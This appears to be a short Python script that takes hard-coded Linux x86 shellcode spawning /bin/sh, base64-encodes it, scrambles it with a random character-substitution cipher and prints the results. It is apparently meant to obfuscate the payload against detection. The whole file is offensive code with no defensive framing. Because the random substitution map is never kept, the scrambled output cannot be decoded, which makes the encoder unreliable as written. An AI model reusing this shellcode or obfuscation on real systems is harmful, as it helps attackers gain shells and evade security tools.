import base64
import random

# Define the shellcode to encode
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# Encode the shellcode with base64
encoded = base64.b64encode(shellcode)

# Create a list of random characters
chars = [chr(i) for i in range(33, 127)]
random.shuffle(chars)

# Create a dictionary of character substitutions
subs = {}
for i in range(len(chars)):
  subs[chars[i]] = chr(i + 33)

# Substitute the characters in the encoded shellcode
substituted = "".join([subs[c] for c in encoded.decode("utf-8")])

# Print the encoded and substituted shellcode
print(f"Encoded: {encoded}")
print(f"Substituted: {substituted}")
